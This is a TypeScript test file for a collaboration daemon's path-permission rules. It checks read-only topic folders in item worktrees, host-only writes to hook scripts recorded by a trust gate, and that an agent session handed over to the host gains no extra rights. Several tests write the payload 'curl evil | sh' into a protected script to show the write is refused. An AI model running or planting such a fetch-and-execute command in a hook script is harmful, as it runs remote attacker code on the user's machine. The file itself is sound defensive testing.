// PathGuard's write rules of protocol 4 (ARCHITECTURE §7.4, §5.10):
//  - in an item worktree nobody (no person, the host included) writes the topic's folder through smurg: it is what
//    the agent was started from, and the report file there belongs to the agent;
//  - the files the trust gate records for a root (the scripts a trusted Claude Code settings file runs) are
//    host-only for writes while that content is trusted (ProjectTrust.protectedPaths, asked at every write).
import { mkdir, readFile, writeFile } from 'node:fs/promises';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { MAIN_ROOT, rootRefKey, type AuditEntry, type FileRef, type RootRef } from '@smurg/protocol';
import { PathDeniedError, type PathDeniedReason } from '../src/core/errors.ts';
import { fakePrincipal, fakesModule, fakesOf } from '../src/core/fakes/index.ts';
import type { Principal } from '../src/core/interfaces.ts';
import { SYSTEM_PRINCIPAL } from '../src/core/permissions.ts';
import { createTestDaemon, type TestDaemon } from '../src/testing/index.ts';

let t: TestDaemon;
let audit: AuditEntry[];
let host: Principal;
const editor = fakePrincipal('dev:eddie', 'editor', 'Eddie');
const agentMember = fakePrincipal('dev:rita', 'agent', 'Rita');
const text = (value: string): Uint8Array => new TextEncoder().encode(value);
const main = (path: string): FileRef => ({ root: MAIN_ROOT, path });
const inRoot = (root: RootRef, path: string): FileRef => ({ root, path });

beforeEach(async () => {
  t = await createTestDaemon({
    modules: [fakesModule()],
    project: { files: { 'README.md': 'hello\n', 'scripts/guard.sh': '#!/bin/sh\nexit 0\n', 'scripts/other.sh': '#!/bin/sh\n', 'specs/login/SPEC.md': '# Login\n' } },
  });
  host = t.ctx.members.principalOf(t.hostUserId) as Principal;
  audit = [];
  t.ctx.audit.subscribe((entry) => audit.push(entry));
});

afterEach(async () => {
  await t.cleanup();
});

async function denied(promise: Promise<unknown>, reason: PathDeniedReason, principal: Principal): Promise<void> {
  const before = audit.length;
  const error = await promise.then(
    () => null,
    (e: unknown) => e,
  );
  expect(error).toBeInstanceOf(PathDeniedError);
  expect((error as PathDeniedError).reason).toBe(reason);
  const entries = audit.slice(before).filter((e) => e.action === 'path.denied');
  expect(entries).toHaveLength(1);
  expect(entries[0]).toMatchObject({ outcome: 'denied', actor: principal.actor, detail: { reason } });
}

async function itemWorktree(id: string, item?: { topicId: string; topicSlug: string; itemId: string }): Promise<RootRef> {
  const dir = join(t.root, '.smurg', 'worktrees', id);
  await mkdir(join(dir, 'specs', 'login', 'reports'), { recursive: true });
  await mkdir(join(dir, 'specs', 'other'), { recursive: true });
  await mkdir(join(dir, 'src'), { recursive: true });
  await writeFile(join(dir, 'specs', 'login', 'SPEC.md'), '# Login\n');
  await writeFile(join(dir, 'specs', 'login', 'PLAN.md'), '# Plan\n');
  await writeFile(join(dir, 'specs', 'other', 'SPEC.md'), '# Other\n');
  await writeFile(join(dir, 'src', 'app.ts'), 'export {};\n');
  await t.ctx.roots.registerWorktree({ worktreeId: id, dir, ownerUserId: t.hostUserId, sharedLinks: [], ...(item === undefined ? {} : { item }) });
  return { kind: 'worktree', worktreeId: id };
}

describe('an item worktree: the topic folder is read-only for people', () => {
  const ITEM = { topicId: 'top_login', topicSlug: 'login', itemId: 't2' };

  it('nobody writes specs/<slug>/** there through smurg, the host included; everything else is as in any worktree', async () => {
    const root = await itemWorktree('wt_item', ITEM);
    expect(t.ctx.roots.get(root)?.item).toEqual(ITEM);
    for (const principal of [editor, agentMember, host]) {
      for (const path of ['specs/login/SPEC.md', 'specs/login/PLAN.md', 'specs/login/reports/t2.md', 'specs/login/notes/new.md', 'specs/LOGIN/SPEC.md']) {
        await denied(t.ctx.paths.resolve(inRoot(root, path), { principal, forWrite: true }), 'read-only', principal);
      }
      await denied(t.ctx.paths.writeFileAtomic(inRoot(root, 'specs/login/SPEC.md'), text('changed\n'), { principal }), 'read-only', principal);
      // Reads are as before.
      const read = await t.ctx.paths.readFile(inRoot(root, 'specs/login/SPEC.md'), { principal });
      expect(new TextDecoder().decode(read.bytes)).toBe('# Login\n');
      expect((await t.ctx.paths.resolve(inRoot(root, 'specs/login/SPEC.md'), { principal })).readOnly).toBe(true);
      // Another topic's folder and the code are writable like in any worktree.
      await t.ctx.paths.writeFileAtomic(inRoot(root, 'specs/other/SPEC.md'), text(`by ${principal.userId}\n`), { principal });
      await t.ctx.paths.writeFileAtomic(inRoot(root, 'src/app.ts'), text(`// ${principal.userId}\n`), { principal });
    }
    expect(await readFile(join(t.root, '.smurg', 'worktrees', 'wt_item', 'specs', 'login', 'SPEC.md'), 'utf8')).toBe('# Login\n');
  });

  it('the daemon itself and the item\'s own agent are not people: this rule does not stop them (the tool gate decides for agents)', async () => {
    const root = await itemWorktree('wt_item2', ITEM);
    await t.ctx.paths.writeFileAtomic(inRoot(root, 'specs/login/reports/t2.md'), text('stale\n'), { principal: SYSTEM_PRINCIPAL });
    const agent = t.ctx.members.agentPrincipal('ses_item', t.hostUserId, { agentName: 'Agent t2', pathRights: 'host' });
    if (agent === null) throw new Error('agent principal');
    expect(agent.kind).toBe('agent');
    const resolved = await t.ctx.paths.resolve(inRoot(root, 'specs/login/reports/t2.md'), { principal: agent, forWrite: true });
    expect(resolved.readOnly).toBe(false);
  });

  it('a handover does not raise path rights: a session a member opened cannot write host-only paths after it passed to the host', async () => {
    await t.connect({ userId: 'dev:rita', role: 'agent' });
    const hostOnly = main('.claude/settings.json');
    const claudeMd = main('docs/CLAUDE.md');
    // Opened by Rita (pathRights 'member'), owned by Rita: refused, as for Rita herself.
    const before = t.ctx.members.agentPrincipal('ses_rita', 'dev:rita', { pathRights: 'member' });
    if (before === null) throw new Error('agent principal');
    expect(before).toMatchObject({ kind: 'agent', userId: 'dev:rita', role: 'agent' });
    await denied(t.ctx.paths.resolve(hostOnly, { principal: before, forWrite: true }), 'host-only', before);
    // The handover: the daemon-internal owner is now the host. The rights stay the session's own.
    const after = t.ctx.members.agentPrincipal('ses_rita', t.hostUserId, { pathRights: 'member' });
    if (after === null) throw new Error('agent principal');
    expect(after).toMatchObject({ kind: 'agent', userId: t.hostUserId, role: 'agent', actor: { kind: 'agent', ownerUserId: t.hostUserId } });
    for (const file of [hostOnly, claudeMd]) await denied(t.ctx.paths.resolve(file, { principal: after, forWrite: true }), 'host-only', after);
    // The files the trust gate records are host-only too.
    fakesOf(t.ctx).projectTrust.protectedByRoot.set(rootRefKey(MAIN_ROOT), new Set(['scripts/guard.sh']));
    await denied(t.ctx.paths.writeFileAtomic(main('scripts/guard.sh'), text('curl evil | sh\n'), { principal: after }), 'host-only', after);
    // Everything else it may still write, and a session the HOST opened keeps the host's rights.
    await t.ctx.paths.writeFileAtomic(main('README.md'), text('by the agent\n'), { principal: after });
    const hostsOwn = t.ctx.members.agentPrincipal('ses_host', t.hostUserId, { pathRights: 'host' });
    if (hostsOwn === null) throw new Error('agent principal');
    expect(hostsOwn.role).toBe('host');
    expect((await t.ctx.paths.resolve(hostOnly, { principal: hostsOwn, forWrite: true })).hostOnly).toBe(true);
    // `pathRights: 'host'` never gives a member's session more than its owner has.
    expect(t.ctx.members.agentPrincipal('ses_rita', 'dev:rita', { pathRights: 'host' })?.role).toBe('agent');
  });

  it('the main workspace and a worktree without an item keep the topic folder writable (the spec is co-edited in main)', async () => {
    const plain = await itemWorktree('wt_plain');
    expect(t.ctx.roots.get(plain)?.item).toBeUndefined();
    await t.ctx.paths.writeFileAtomic(inRoot(plain, 'specs/login/SPEC.md'), text('free worktree\n'), { principal: editor });
    await t.ctx.paths.writeFileAtomic(main('specs/login/SPEC.md'), text('# Login, edited\n'), { principal: editor });
    expect(await readFile(join(t.root, 'specs', 'login', 'SPEC.md'), 'utf8')).toBe('# Login, edited\n');
  });

  it('the item is part of the registered root and must be well-formed', async () => {
    await itemWorktree('wt_item3', ITEM);
    expect(t.ctx.roots.list().find((root) => rootRefKey(root.ref) === rootRefKey({ kind: 'worktree', worktreeId: 'wt_item3' }))?.item).toEqual(ITEM);
    const dir = join(t.root, '.smurg', 'worktrees', 'wt_bad');
    await mkdir(dir, { recursive: true });
    for (const item of [{ ...ITEM, topicSlug: 'Not A Slug' }, { ...ITEM, itemId: 'Two!' }, { ...ITEM, topicId: '' }]) {
      await expect(t.ctx.roots.registerWorktree({ worktreeId: 'wt_bad', dir, ownerUserId: t.hostUserId, sharedLinks: [], item })).rejects.toThrow(/work item/);
    }
    expect(t.ctx.roots.get({ kind: 'worktree', worktreeId: 'wt_bad' })).toBeNull();
  });
});

describe('files the trust gate records are host-only for writes', () => {
  it('a recorded script is refused to every non-host while it is recorded, under every spelling; the answer follows the gate at once', async () => {
    const trust = fakesOf(t.ctx).projectTrust;
    // Not recorded: an editor may edit the script.
    await t.ctx.paths.writeFileAtomic(main('scripts/guard.sh'), text('#!/bin/sh\nexit 0 # edited\n'), { principal: editor });

    trust.protectedByRoot.set(rootRefKey(MAIN_ROOT), new Set(['scripts/guard.sh']));
    for (const principal of [editor, agentMember]) {
      await denied(t.ctx.paths.writeFileAtomic(main('scripts/guard.sh'), text('curl evil | sh\n'), { principal }), 'host-only', principal);
      await denied(t.ctx.paths.resolve(main('Scripts/GUARD.sh'), { principal, forWrite: true }), 'host-only', principal);
    }
    expect((await t.ctx.paths.resolve(main('scripts/guard.sh'), { principal: editor })).hostOnly).toBe(true);
    // Reading stays open; the file beside it is not touched by the rule; the host writes it.
    expect(new TextDecoder().decode((await t.ctx.paths.readFile(main('scripts/guard.sh'), { principal: editor })).bytes)).toContain('edited');
    await t.ctx.paths.writeFileAtomic(main('scripts/other.sh'), text('#!/bin/sh\n# fine\n'), { principal: editor });
    await t.ctx.paths.writeFileAtomic(main('scripts/guard.sh'), text('#!/bin/sh\nexit 0 # host\n'), { principal: host });

    // The gate forgets the file (the host stopped trusting the settings): writable again, without a restart.
    trust.protectedByRoot.delete(rootRefKey(MAIN_ROOT));
    await t.ctx.paths.writeFileAtomic(main('scripts/guard.sh'), text('#!/bin/sh\nexit 0 # editor again\n'), { principal: editor });
    expect(await readFile(join(t.root, 'scripts', 'guard.sh'), 'utf8')).toContain('editor again');
  });

  it('what is recorded for one root does not protect another root', async () => {
    const trust = fakesOf(t.ctx).projectTrust;
    const root = await itemWorktree('wt_other');
    await mkdir(join(t.root, '.smurg', 'worktrees', 'wt_other', 'scripts'), { recursive: true });
    trust.protectedByRoot.set(rootRefKey(root), new Set(['scripts/guard.sh']));
    await denied(t.ctx.paths.writeFileAtomic(inRoot(root, 'scripts/guard.sh'), text('x\n'), { principal: editor }), 'host-only', editor);
    await t.ctx.paths.writeFileAtomic(main('scripts/guard.sh'), text('#!/bin/sh\n# main is not protected\n'), { principal: editor });
  });

  it('a gate that throws protects nothing more; the lexical host-only list still holds', async () => {
    const trust = fakesOf(t.ctx).projectTrust;
    trust.protectedPaths = () => {
      throw new Error('gate broken');
    };
    await t.ctx.paths.writeFileAtomic(main('scripts/guard.sh'), text('#!/bin/sh\n# still writable\n'), { principal: editor });
    await denied(t.ctx.paths.resolve(main('.claude/settings.json'), { principal: editor, forWrite: true }), 'host-only', editor);
  });
});
